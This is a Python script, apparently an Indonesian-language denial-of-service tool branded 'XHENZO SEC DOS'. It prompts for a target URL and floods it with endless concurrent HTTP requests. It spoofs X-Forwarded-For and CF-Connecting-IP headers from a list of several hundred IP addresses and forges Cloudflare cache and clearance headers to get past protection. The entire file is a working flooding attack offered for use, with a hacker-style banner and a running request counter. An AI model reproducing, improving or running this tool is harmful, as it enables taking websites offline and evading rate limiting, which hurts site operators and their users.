
import os  
import time  
import random  
import string  
from urllib.parse import urlparse  
from rich.console import Console  
from rich.panel import Panel  
from rich.align import Align  
from fake_useragent import UserAgent  
import asyncio  
import aiohttp  
import cloudscraper  

#================# RICH & UA #================#

console = Console()  
ua = UserAgent()  
  
#================# RESPON #================#

rcount = 0  
lastip = "PROSES"  
responip = "PROSES"  

#================# HEADERS #================#

site1 = "none"  
accept = "*/*"  

#================# RANDOM #================#

def randstr(n):  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))  

#================# LOGO #================#
def logo2():  
    return f"""  
[bold bright_green]⠀⠀  ⠀⣀⡀⠀⠀⠀⠀⠀ ⠀ ⠀⠀⣀⡀⠀⠀⠀⠀
⠀⠀ ⠀⠀⠀⠙⢷⣤⣤⣴⣶⣶⣦⣤⣤⡾⠋
⠀⠀⠀⠀ ⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦
⠀⠀⠀ ⠀⣼⣿⣿ ⣹⣿⣿⣿⣿⣏ ⣿⣿⣧
⠀⠀ ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣠⣿⣄ ⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤ ⣠⣿⣄
⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿       [bold bright_yellow][[bold bright_green]႒[bold bright_yellow]] [bold bright_white]Device [bold bright_green]: [bold bright_white]Android 14
[bold bright_green]⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿       [bold bright_yellow][[bold bright_green]Ꭷ[bold bright_yellow]] [bold bright_white]Status [bold bright_green]: [bold bright_white]Online
[bold bright_green]⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿       [bold bright_yellow][[bold bright_green]★[bold bright_yellow]] [bold bright_white]Rooted [bold bright_green]: [bold bright_white]False
[bold bright_green]⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿       [bold bright_yellow][[bold bright_green]❏[bold bright_yellow]] [bold bright_white]Script [bold bright_green]: [bold bright_white]Python3
[bold bright_green]⠻⣿⠟ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⠻⣿⠟
⠀⠀⠀ ⠀⠉⠉⣿⣿⣿⣿⠉⠉⣿⣿⣿⣿⠉⠉
⠀⠀⠀⠀ ⠀⠀⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⠀ ⠀⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿

[bold bright_white]  
━━━━━━━━> [bold bright_red][ [bold bright_white]XHNEZO SEC DOS MAX [bold bright_red]] [bold bright_white]<━━━━━━━━  

[bold bright_white]━━━━━━━━> [bold bright_red][ [bold bright_white]CLAY DOS ALL READY [bold bright_red]] [bold bright_white]<━━━━━━━━  
"""  
  
#================# RANDOM IP #================#
def randomip(ip_list):  
    while True:  
        ips = ip_list.copy()  
        random.shuffle(ips)  
        for ip in ips:  
            yield ip  

#================# LIST IP #================#
fakeip = [  
"103.51.205.72",  
"104.28.245.130",  
"114.10.127.121",  
"114.10.76.45",  
"103.108.30.71",  
"103.121.16.124",  
"103.13.205.74",  
"103.189.201.113",  
"103.51.205.108",  
"114.125.79.169",
"124.213.57.150",
"102.65.31.65",
"178.228.131.189",
"146.175.3.204",
"191.131.92.53",
"16.151.10.62",
"217.151.78.248",
"64.194.230.86",
"63.85.183.64",
"92.64.203.171",
"15.27.233.60",
"98.202.144.32",
"185.11.158.134",
"174.40.199.98",
"196.130.219.53",
"166.77.174.18",
"17.244.211.154",
"1.179.156.145",
"15.150.75.8",
"185.248.181.140",
"56.160.27.246",
"230.123.153.37",
"2.117.46.55",
"39.62.230.122",
"57.152.7.97",
"174.114.233.130",
"64.173.83.121",
"38.27.248.215",
"107.72.60.74",
"176.110.255.121",
"106.202.174.12",
"252.159.10.75",
"79.213.68.93",
"37.227.11.231",
"80.225.41.246",
"247.81.1.87",
"180.151.127.97",
"20.63.164.218",
"131.224.88.231",
"170.121.85.192",
"78.185.153.148",
"13.131.145.48",
"223.113.206.168",
"41.12.42.108",
"42.239.112.162",
"181.216.86.49",
"16.42.31.10",
"4.250.112.72",
"201.188.74.14",
"53.179.135.40",
"252.162.250.33",
"169.54.97.0",
"84.165.233.134",
"163.188.118.107",
"110.43.65.175",
"14.37.101.2",
"144.2.177.223",
"242.35.66.250",
"181.169.196.61",
"73.189.243.233",
"154.74.8.101",
"57.241.87.132",
"124.114.114.124",
"123.104.212.68",
"7.230.142.52",
"140.19.224.184",
"202.182.176.224",
"232.58.11.216",
"80.26.130.119",
"189.4.247.210",
"84.198.90.15",
"189.147.205.39",
"71.103.84.10",
"93.133.229.10",
"175.40.48.5",
"67.26.32.121",
"102.246.137.212",
"103.29.28.199",
"172.10.186.220",
"162.33.46.5",
"158.21.12.91",
"192.157.202.62",
"89.61.213.205",
"78.116.51.120",
"29.181.251.191",
"26.188.156.136",
"191.213.150.42",
"28.174.162.196",
"10.54.174.13",
"54.56.80.163",
"243.131.50.5",
"26.130.89.66",
"168.196.127.3",
"251.124.190.148",
"76.10.62.105",
"0.105.92.55",
"208.244.59.117",
"41.20.20.114",
"12.66.214.141",
"228.56.209.179",
"72.56.193.39",
"122.17.93.198",
"247.222.207.175",
"7.96.19.0",
"227.41.183.230",
"123.45.194.65",
"144.79.167.1",
"220.183.192.163",
"229.214.140.6",
"174.251.82.56",
"71.213.4.114",
"235.206.38.236",
"165.29.107.120",
"235.42.151.39",
"185.67.243.246",
"216.55.31.233",
"16.27.125.4",
"43.28.176.238",
"5.30.193.17",
"158.177.26.235",
"149.145.59.93",
"13.66.130.57",
"218.146.144.84",
"86.168.108.83",
"3.247.40.79",
"123.222.138.118",
"212.238.172.133",
"164.190.22.241",
"166.209.215.84",
"83.31.179.86",
"114.152.164.200",
"7.168.46.221",
"21.211.98.76",
"132.41.62.68",
"123.208.254.69",
"18.75.121.43",
"42.141.12.74",
"30.195.2.22",
"89.11.252.41",
"133.103.222.163",
"208.102.208.151",
"25.14.52.112",
"133.68.241.125",
"250.8.243.179",
"112.94.159.42",
"56.143.181.79",
"121.153.1.189",
"198.18.116.191",
"18.23.236.175",
"63.190.156.0",
"108.152.80.96",
"231.116.149.39",
"213.255.235.234",
"48.67.60.83",
"44.75.52.166",
"74.6.216.28",
"132.80.244.41",
"126.68.177.112",
"192.112.255.197",
"69.227.160.123",
"179.117.9.178",
"240.22.205.124",
"67.158.122.55",
"148.234.165.66",
"49.202.250.8",
"83.251.190.20",
"208.85.207.104",
"163.124.47.7",
"144.193.62.233",
"170.62.63.41",
"27.137.225.34",
"183.10.154.32",
"250.194.251.184",
"90.227.188.34",
"117.205.208.233",
"226.203.40.111",
"250.0.165.53",
"194.155.138.208",
"62.178.220.120",
"11.66.173.224",
"117.218.79.95",
"16.29.22.103",
"223.169.241.228",
"129.46.24.125",
"130.133.164.167",
"88.193.235.12",
"44.200.11.204",
"171.94.50.40",
"82.184.14.88",
"195.62.200.12",
"126.36.96.159",
"101.165.191.244",
"99.228.49.72",
"250.151.25.52",
"232.3.173.83",
"79.1.54.248",
"22.134.183.73",
"229.23.158.235",
"206.20.17.223",
"61.235.119.165",
"77.229.0.120",
"138.246.244.56",
"54.243.56.123",
"218.83.119.24",
"199.206.231.231",
"29.22.77.55",
"120.234.142.181",
"142.252.208.164",
"242.90.11.226",
"34.71.147.110",
"12.227.133.47",
"157.40.171.143",
"86.4.0.51",
"85.134.158.102",
"217.65.96.242",
"3.150.170.192",
"52.165.221.55",
"195.51.1.106",
"109.91.56.36",
"16.93.154.106",
"41.74.24.54",
"244.89.66.147",
"239.253.129.56",
"163.200.52.74",
"208.139.87.240",
"69.254.123.227",
"11.4.139.58",
"141.149.179.65",
"250.201.236.40",
"185.91.31.112",
"169.68.174.222",
"103.204.207.126",
"20.254.37.59",
"65.96.193.173",
"200.217.157.236",
"218.241.130.219",
"69.102.76.158",
"64.152.77.84",
"56.242.234.165",
"134.111.251.92",
"99.29.108.239",
"14.7.221.179",
"199.235.137.153",
"183.108.41.134",
"98.191.132.98",
"246.80.160.12",
"157.163.153.239",
"247.173.144.182",
"32.206.196.19",
"3.162.133.16",
"171.4.167.169",
"187.253.21.181",
"84.8.135.71",
"104.77.242.175",
"90.150.49.122",
"189.204.14.156",
"176.14.50.251",
"25.59.12.87",
"98.192.113.30",
"39.49.12.166",
"6.192.14.27",
"236.134.82.221",
"241.158.233.251",
"195.52.0.68",
"252.136.239.74",
"117.108.130.72",
"247.108.131.226",
"45.226.163.47",
"39.239.195.39",
"46.224.238.82",
"161.185.227.164",
"52.165.167.209",
"36.74.12.109",
"69.27.40.48",
"217.35.234.163",
"83.239.107.230",
"67.20.53.134",
"138.194.108.6",
"103.181.126.123",
"236.143.206.19",
"186.131.55.223",
"19.229.213.45",
"170.149.103.237",
"228.72.51.154",
"49.139.187.58",
"84.120.42.232",
"80.149.86.118",
"130.159.189.18",
"194.9.88.211",
"11.214.73.31",
"199.214.64.13",
"43.6.1.53",
"255.209.116.32",
"134.76.168.22",
"240.189.145.78",
"6.197.94.237",
"129.36.14.27",
"96.220.222.108",
"61.255.40.116",
"33.98.39.207",
"68.248.48.27",
"14.83.82.37",
"133.224.124.66",
"199.115.43.212",
"210.176.1.100",
"54.179.191.149",
"236.198.212.166",
"115.200.142.89",
"177.2.102.162",
"75.114.16.107",
"121.24.213.129",
"32.146.211.103",
"105.193.109.5",
"233.0.223.136",
"237.118.146.170",
"126.7.25.20",
"4.85.15.79",
"111.64.244.83",
"38.94.112.59",
"193.191.150.194",
"247.219.98.109",
"2.1.159.250",
"173.213.177.39",
"174.149.66.229",
"97.97.117.169",
"75.46.16.155",
"29.246.252.221",
"241.79.3.204",
"223.220.128.209",
"214.91.134.247",
"188.65.20.100",
"138.13.95.46",
"3.244.22.138",
"226.220.109.151",
"126.16.82.248",
"214.203.221.72",
"151.77.185.85",
"206.62.58.82",
"240.195.128.251",
"101.189.239.85",
"97.239.21.47",
"93.136.156.201",
"145.252.97.83",
"131.227.128.106",
"178.77.142.56",
"75.108.231.188",
"26.231.107.111",
"255.30.62.13",
"214.123.128.251",
"220.139.91.60",
"175.61.88.233",
"139.149.235.44",
"206.185.254.244",
"8.166.195.23",
"64.224.205.117",
"248.235.13.174",
"182.147.126.66",
"244.77.175.228",
"81.21.78.80",
"90.11.240.196",
"6.41.12.132",
"134.212.239.100",
"40.254.217.81",
"3.178.1.134",
"39.130.26.206",
"191.147.253.96",
"190.143.55.125",
"218.0.111.232",
"208.223.4.176",
"6.150.102.222",
"249.199.128.242",
"183.91.207.175",
"29.189.22.55",
"73.121.234.230",
"70.88.146.217",
"222.218.203.188",
"202.197.28.249",
"185.155.241.205",
"254.178.33.204",
"198.165.100.80",
"127.6.33.101",
"129.158.232.252",
"238.251.180.31",
"238.239.76.215",
"59.152.89.171",
"247.8.204.54",
"60.159.188.131",
"208.172.232.239",
"228.206.84.203",
"136.210.122.71",
"246.159.122.86",
"26.218.139.85",
"89.149.115.230",
"24.113.169.106",
"222.57.99.154",
"204.173.171.165",
"187.103.144.236",
"54.202.108.232",
"156.102.247.104",
"224.205.177.155",
"62.39.71.102",
"163.117.140.246",
"152.183.123.128",
"146.133.189.185",
"141.101.221.155",
"27.244.238.44",
"175.133.158.202",
"254.194.163.43",
"142.184.247.48",
"123.187.196.173",
"233.55.220.120",
"134.56.27.24",
"180.240.106.104",
"111.163.43.222",
"69.83.184.196",
"171.51.169.97",
"127.161.186.174",
"163.181.225.128",
"167.230.153.191",
"84.38.89.203",
"109.34.190.66",
"92.240.43.223",
"137.5.39.254",
"80.247.200.140",
"34.180.213.2",
"252.1.181.90",
"42.1.16.60",
"53.229.234.38",
"66.19.82.59",
"215.187.16.44",
"167.138.104.59",
"134.37.220.188",
"9.175.216.213",
"66.71.77.2",
"183.81.114.161",
"135.135.228.207",
"109.242.189.243",
"183.246.56.26",
"229.92.24.146",
"87.232.71.178",
"80.185.136.58",
"66.254.163.185",
"199.78.195.193",
"183.120.62.72",
"45.95.203.212",
"198.87.123.34",
"206.73.123.129",
"200.75.79.50",
"113.213.142.14",
"143.223.141.22",
"188.229.48.214",
"245.72.70.123",
"130.13.242.140",
"185.30.250.97",
"201.194.217.94",
"153.125.63.233",
"108.241.78.218",
"143.41.236.205",
"148.1.198.230",
"254.146.33.69",
"224.216.80.58",
"44.158.24.30",
"40.192.83.75",
"100.51.130.10",
"5.224.150.48",
"152.9.74.64",
"237.188.164.82",
"130.243.145.87",
"227.205.227.117",
"232.55.246.186",
"175.142.94.117",
"231.186.137.40",
"51.234.71.63",
"14.249.46.211",
"102.15.20.233",
"96.177.203.29",
"243.217.123.34",
"161.4.209.157",
"8.243.196.196",
"155.0.231.210",
"36.187.18.135",
"57.231.97.155",
"56.116.166.140",
"111.232.217.41",
"24.47.239.24",
"6.60.232.184",
"53.39.226.125",
"236.212.226.95",
"39.88.53.13",
"229.214.112.188",
"123.97.20.221",
"208.116.27.24",
"31.228.152.196",
"152.131.236.171",
"39.142.130.152",
"135.147.74.74",
"217.240.117.48",
"8.254.23.138",
"248.126.137.51",
"117.212.32.172",
"60.89.169.0",
"170.209.4.89",
"173.25.248.179",
"155.218.195.40",
"238.161.204.88",
"165.108.27.216",
"91.222.232.37",
"133.132.143.102",
"161.102.109.6",
"235.103.128.45",
"157.12.159.50",
"181.133.210.143",
"82.172.178.118",
"141.91.50.11",
"103.96.81.235",
"28.125.177.177",
"238.24.58.186",
"63.133.86.18",
"235.186.209.21",
"84.223.67.85",
"252.58.137.19",
"148.140.239.85",
"139.166.65.21",
"195.186.82.233",
"160.131.239.157",
"23.185.250.30",
"146.216.67.124",
"132.100.26.28",
"185.157.81.97",
"165.174.62.75",
"100.127.202.30",
"177.120.196.56",
"230.197.170.222",
"26.84.43.20",
"56.121.171.45",
"138.59.101.223",
"129.156.140.148",
"207.87.113.246",
"115.42.210.97",
"207.137.210.188",
"110.205.65.63",
"111.141.47.15",
"232.35.132.91",
"104.41.59.167",
"173.64.204.58",
"84.195.22.243",
"96.43.189.202",
"233.95.86.248",
"162.157.221.150",
"230.233.50.121",
"118.190.18.146",
"53.17.173.140",
"228.184.237.59",
"24.69.135.130",
"50.176.234.75",
"99.195.111.81",
"190.134.45.24",
"160.134.149.5",
"54.114.229.127",
"51.179.252.112",
"131.122.217.54",
"161.175.102.196",
"102.138.36.171",
"0.201.96.44",
"95.172.82.154",
"13.9.92.89",
"40.18.201.28",
"248.6.203.53",
"101.246.22.220",
"134.53.188.128",
"132.112.42.92",
"78.164.233.53",
"68.238.4.113",
"188.20.135.252",
"91.12.110.89",
"1.154.171.62",
"183.13.131.167",
"161.205.116.252",
"145.92.55.66",
"225.237.195.251",
"78.23.110.159",
"228.131.177.143",
"114.198.200.144",
"133.39.73.35",
"228.208.253.238",
"86.179.198.53",
"151.139.249.176",
"208.243.200.19",
"125.199.3.118",
"124.147.207.84",
"136.79.135.253",
"139.205.184.212",
"6.8.171.103",
"200.33.158.114",
"100.151.196.164",
"139.227.23.123",
"93.124.131.205",
"104.31.225.204",
"10.88.92.167",
"236.61.220.67",
"122.34.52.141",
"60.169.38.26",
"122.215.219.211",
"134.92.71.160",
"96.131.220.50",
"65.240.121.237",
"73.221.76.215",
"27.161.163.133",
"197.94.6.202",
"62.119.44.16",
"134.132.199.65",
"169.42.5.113",
"108.22.140.19",
"93.148.218.6",
"205.78.170.86",
"170.203.174.132",
"237.215.56.47",
"190.164.153.92",
"10.152.217.189",
"10.150.56.132",
"122.41.4.246",
"129.177.4.252",
"224.33.25.140",
"9.114.37.84",
"189.111.0.174",
"53.191.114.157",
"128.158.39.107",
"158.109.229.83",
"174.25.103.156",
"202.8.83.125",
"91.60.242.90",
"198.104.32.71",
"128.79.120.175",
"224.218.165.153",
"236.166.109.111",
"186.125.46.94",
"24.139.44.47",
"40.141.159.170",
"118.129.206.130",
"140.195.233.64",
"4.227.151.250",
"190.69.234.209",
"15.178.40.44",
"133.142.172.26",
"33.21.39.143",
"115.49.131.220",
"67.245.77.206",
"203.1.11.185",
"76.20.161.92",
"174.96.30.132",
"169.173.138.244",
"9.201.68.30",
"87.163.91.156",
"215.126.177.180",
"201.73.222.141",
"16.4.140.220",
"50.111.148.119",
"239.113.7.12",
"234.96.141.78",
"70.146.121.249",
"190.16.42.86",
"112.196.112.224",
"41.246.130.165",
"23.143.103.73",
"44.98.125.122",
"52.169.157.152",
"79.247.0.169",
"25.108.72.82",
"250.188.152.195",
"187.172.34.187",
"33.62.25.239",
"145.79.213.144",
"147.176.244.71",
"251.225.123.188",
"144.69.247.2",
"186.199.31.238",
"177.136.250.34",
"215.150.46.178",
"245.43.132.214",
"82.39.164.44",
"104.171.54.252",
"226.44.42.255",
"208.117.43.213",
"237.28.209.50",
"114.23.193.44",
"25.95.46.217",
"20.189.125.148",
"122.73.9.245",
"200.200.54.255",
"216.237.97.71",
"202.2.180.215",
"172.83.103.148",
"180.166.176.217",
"181.184.132.192",
"146.119.236.126",
"59.189.48.205",
"142.37.3.149",
"77.213.92.41",
"255.5.124.121",
"246.97.204.128",
"105.64.139.154",
"122.93.120.115",
"147.43.191.208",
"217.177.81.213",
"98.63.219.33",
"63.18.221.188",
"131.102.207.230",
"212.127.139.240",
"165.18.181.209",
"185.41.226.67",
"47.89.63.148",
"191.11.99.133",
"116.227.247.25",
"235.197.243.13",
"38.73.247.222",
"31.252.253.106",
"82.107.106.173",
"246.22.201.165",
"60.242.173.152",
"38.234.241.51",
"110.15.219.84",
"177.175.132.249",
"165.116.14.199",
"112.220.13.212",
"212.228.30.186",
"213.205.187.234",
"166.84.48.62",
"205.176.16.128",
"248.52.40.170",
"90.132.112.149",
"170.128.200.1",
"78.39.69.143",
"184.191.235.201",
"190.106.81.187",
"177.51.228.211",
"8.225.254.202",
"27.46.158.106",
"6.248.244.52",
"59.124.189.170",
"254.63.35.14",
"154.134.243.233",
"254.248.70.65",
"84.44.186.102",
"101.254.125.48",
"250.105.163.0",
"197.65.6.68",
"58.222.212.108",
"109.4.140.179",
"235.126.57.56",
"225.52.167.238",
"37.135.145.170",
"54.39.64.97",
"68.100.55.87",
"69.245.16.120",
"31.124.196.179",
"54.96.183.195",
"138.217.99.153",
"124.134.8.151",
"32.164.223.200",
"128.11.198.184",
"0.164.15.35",
"194.238.94.95",
"9.120.139.221",
"202.150.211.246",
"167.54.154.0",
"82.201.32.129",
"49.140.167.119",
"204.4.73.251",
"239.141.73.5",
"85.237.103.246",
"102.59.251.66",
"18.27.155.223",
"155.102.168.141",
"198.72.189.227",
"26.122.191.206",
"9.7.90.107",
"152.73.52.50",
"30.47.97.84",
"134.144.224.169",
"247.123.161.47",
"86.123.171.130",
"113.250.142.14",
"217.242.250.220",
"33.217.135.195",
"72.216.95.215",
"148.164.72.134",
"74.39.78.120",
"69.126.99.10",
"37.65.200.158",
"104.223.2.175",
"176.28.255.56",
"71.120.27.43",
"172.136.79.78",
"2.229.219.18",
"192.99.230.76",
"171.253.145.177",
"30.202.169.252",
"85.69.91.75",
"89.174.183.117",
"251.253.126.207",
"65.97.226.60",
"250.59.175.57",
"145.54.55.150",
"7.210.29.222",
"44.232.167.57",
"101.213.154.169",
"33.183.156.254",
"68.224.147.2",
"237.224.103.17",
"13.204.186.113",
"131.68.211.166",
"152.195.157.67",
"245.113.132.132",
"17.148.64.104",
"23.55.238.129",
"214.235.122.50",
"241.252.188.114",
"124.249.181.255",
"110.191.75.216",
"116.43.63.162",
"43.120.98.127",
"57.244.88.76",
"194.51.113.64",
"112.165.212.101",
"14.67.158.32",
"32.103.205.252",
"105.153.188.211",
"29.244.65.222",
"113.142.188.109",
"66.66.224.223",
"245.86.164.105",
"178.112.234.209",
"7.197.61.23",
"52.158.225.67",
"161.244.75.67",
"91.91.26.171",
"150.41.128.197",
"162.172.22.22",
"27.77.245.107",
"146.213.220.116",
"177.210.66.99",
"250.219.57.29",
"13.12.130.91",
"41.170.165.193",
"97.113.171.204",
"51.100.235.5",
"93.127.106.204",
"249.145.245.121",
"7.201.162.30",
"152.202.36.38",
"90.126.152.34",
"216.91.162.69",
"85.132.89.39",
"175.21.41.155",
"95.41.118.183",
"132.174.66.200",
"21.9.195.46",
"60.134.125.68",
"81.172.180.219",
"128.191.94.110",
"142.217.22.172",
"6.204.218.119",
"234.6.17.161",
"90.22.241.238",
"189.183.76.210",
"26.0.115.205",
"248.76.223.100",
"231.88.99.180",
"98.73.58.115",
"87.131.123.154",
"7.47.196.17",
"170.35.197.85",
"76.182.128.215",
"54.83.112.51",
"169.248.255.241",
"7.93.229.64",
"26.17.104.238",
"64.245.98.65",
"224.166.64.76",
"14.149.228.28",
"147.209.204.191",
"28.94.205.54",
"244.235.186.8",
"16.21.76.226",
"127.160.30.102",
"137.79.38.179",
"136.253.76.29",
"103.60.104.6",
"90.40.35.182",
"87.8.252.177",
"226.93.134.222",
"193.248.199.62",
"91.193.242.100",
"187.41.24.24",
"48.148.22.142",
"180.134.162.99",
"238.101.59.236",
"207.132.48.112",
"177.132.65.124",
"2.82.144.223",
"64.73.242.39",
"27.36.58.34",
"206.126.238.72",
"254.157.115.99",
"131.211.206.203",
"125.249.253.209",
"202.201.199.230",
"138.148.222.135",
"145.25.228.35",
"36.236.121.170",
"117.238.137.173",
"45.73.80.47",
"108.45.110.218",
"23.173.208.70",
"173.178.187.76",
"25.89.32.199",
"114.183.202.252",
"54.239.35.41",
"143.211.169.96",
"52.110.28.194",
"252.110.216.178",
"213.246.85.150",
"183.46.197.173",
"107.164.157.66",
"125.69.80.124",
"232.158.155.102",
"207.232.50.208",
"0.142.111.22",
"207.113.218.4",
"48.51.211.51",
"155.38.93.45",
"79.210.132.107",
"66.72.245.120",
"52.53.70.16",
"33.230.231.27",
"140.19.116.17",
"59.157.217.125",
"161.254.65.218",
"64.96.19.122",
"107.166.179.147",
"234.200.17.215",
"231.165.165.96",
"203.191.184.70",
"38.14.164.4",
"100.138.204.205",
"43.21.118.114",
"112.19.74.217",
"154.217.117.206",
"55.87.186.145",
"14.213.40.178",
"240.84.231.24",
"112.243.173.140",
"99.133.251.235",
"51.95.177.31",
"235.247.63.108",
"107.226.35.175",
"74.66.58.115",
"90.206.38.48",
"78.130.117.32",
"140.252.11.231",
"166.75.246.51",
"194.56.15.64",
"105.139.244.255",
"56.50.246.4",
"163.91.56.44",
"87.65.213.170",
"125.10.238.131",
"253.82.242.177",
"146.17.39.117",
"236.53.216.207",
"33.170.16.85",
"121.224.8.61",
"143.16.38.75",
"155.7.184.169",
"71.120.222.162",
"196.155.96.20",
"221.101.159.150",
"111.109.189.66",
"191.168.185.212",
"36.44.79.227",
"92.80.135.76",
"184.253.222.105",
"54.31.78.109",
"164.77.193.195",
"206.147.42.170",
"168.28.225.73",
"104.133.100.238",
"142.173.172.81",
"233.89.88.236",
"127.116.122.109",
"51.30.37.188",
"59.167.44.179",
"196.123.71.208",
"243.68.90.92",
"67.78.154.225",
"152.188.5.139",
"186.46.108.148",
"213.100.46.204",
"108.113.58.249",
"117.75.218.123",
]  
ipgen = randomip(fakeip)  

#================# HEADERS SERANGAN #================#
async def kirim(url, ipadr, method='GET', data=None, headers=None):  
    global responip  
    parsed = urlparse(url)  
    hdrs = {} if headers is None else headers.copy()  
    hdrs["X-Forwarded-For"] = ipadr  
    hdrs.setdefault("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")  
    hdrs.setdefault("Accept-Language", "en-US,en;q=0.5")  
    hdrs["cf-cache-status"] = "BYPASS"  
    hdrs["CF-Connecting-IP"] = ipadr  
    hdrs["X-Forwarded-Host"] = ipadr  
    hdrs["sec-fetch-site"] = site1  
    hdrs["CF-Visitor"] = "{'scheme':'https'}"  
    hdrs["CF-RAY"] = "randomRayValue"  
    hdrs["Max-Forwards"] = "10"  
    hdrs["x-requested-with"] = "XMLHttpRequest"  
    hdrs["x-forwarded-proto"] = "https"  
    hdrs["origin"] = f"https://{parsed.netloc}"  
    hdrs["cache-control"] = "no-cache"  
    hdrs["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"'  
    hdrs["sec-ch-ua-mobile"] = "?0"  
    hdrs["accept"] = accept  
    hdrs["sec-fetch-mode"] = "navigate"  
    hdrs["sec-ch-ua-platform"] = "Windows"  
    hdrs["upgrade-insecure-requests"] = "1"  
    hdrs["referer"] = "https://google.com"  
    hdrs["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40)  
    try:  
        async with aiohttp.ClientSession() as session:  
            if method.upper() == "GET":  
                async with session.get(url, headers=hdrs, data=data, timeout=3) as response:  
                    responip = f"{response.status}"  
            elif method.upper() == "POST":  
                async with session.post(url, headers=hdrs, data=data, timeout=3) as response:  
                    responip = f"{response.status}"  
            else:  
                async with session.request(method.upper(), url, headers=hdrs, data=data, timeout=3) as response:  
                    responip = f"{response.status}"  
    except Exception as e:  
        responip = f"BYPASS"  

#================# SERANGAN GANDA #================#
async def consattack(link):  
    global rcount, lastip  
    semaphore = asyncio.Semaphore(500)
    while True:  
        async with semaphore:  
            ipadr = next(ipgen)  
            rcount += 1  
            lastip = ipadr  
            asyncio.create_task(kirim(link, ipadr, "GET", None, {}))  
        await asyncio.sleep(0)  

#================# MULAI ATTACK #================#
async def runing(link):  
    asyncio.create_task(consattack(link))  
    cycle = 1  
    while True:  
        waktu = 60 * cycle  
        mulai = time.time()  
        selesai = mulai + waktu  
        while time.time() < selesai:  
            remaining = int(selesai - time.time())  
            reqs = rcount  
            ip_resp = responip  
            ip_used = lastip  
            logo1 = logo2()  
            statusnya = (  
                f"[bold bright_red][[bold bright_yellow]?[bold bright_red]] [bold bright_red][ [bold bright_white]SERANGAN DALAM [bold bright_red]] [bold bright_white]:[bold bright_red] [ [bold bright_green]{remaining} SECCOND [bold bright_red]]\n"  
                f"[bold bright_red][[bold bright_yellow]?[bold bright_red]] [bold bright_red][ [bold bright_white]TOTAL REQUESTS[bold bright_red] ][bold bright_white] : [bold bright_red][[bold bright_green] {reqs}[bold bright_red] ]\n"  
                f"[bold bright_red][[bold bright_yellow]?[bold bright_red]] [bold bright_red][ [bold bright_white]RESPONSE [bold bright_red]      ] [bold bright_white]:[bold bright_red] [ [bold bright_green]{ip_resp} [bold bright_red]]\n"
            )  
            console.clear()  
            panel = Panel(Align.left(f"{logo1}\n\n{statusnya}"), border_style="bright_yellow", title="[ ATTACKING ]")  
            console.print(panel)  
            await asyncio.sleep(1)  
        cycle += 1  

#================# INPUT LINK #================#
async def main():  
    console.clear()  
    panel = Panel(Align.left(logo2()), border_style="bright_yellow", title="[ XHENZO SEC DOS ]")  
    console.print(panel)  
    link = console.input("[bold bright_red][[bold bright_green]+[bold bright_red]] [ [bold bright_white]TARGET URL [bold bright_red]] [bold bright_green]: ")  
    console.clear()  
    await runing(link)  

#================# ALL MAIN #================#
if __name__ == '__main__':  
    asyncio.run(main())
